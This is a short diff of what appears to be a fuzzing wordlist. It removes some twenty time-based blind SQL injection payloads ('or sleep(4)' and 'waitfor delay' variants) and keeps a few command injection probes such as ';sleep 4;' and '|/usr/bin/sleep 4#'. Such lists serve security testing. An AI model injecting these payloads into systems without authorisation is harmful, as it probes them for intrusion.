@@ -1,24 +1,4 @@
 sleep(4)#
-1 or sleep(4)#
-" or sleep(4)#
-' or sleep(4)#
-" or sleep(4)="
-' or sleep(4)='
-1) or sleep(4)#
-") or sleep(4)="
-') or sleep(4)='
-1)) or sleep(4)#
-")) or sleep(4)="
-')) or sleep(4)='
-;waitfor delay '0:0:4'--
-);waitfor delay '0:0:4'--
-';waitfor delay '0:0:4'--
-";waitfor delay '0:0:4'--
-');waitfor delay '0:0:4'--
-");waitfor delay '0:0:4'--
-));waitfor delay '0:0:4'--
-'));waitfor delay '0:0:4'--
-"));waitfor delay '0:0:4'--
 ;sleep 4;
 |sleep 4#
 |/usr/bin/sleep 4#
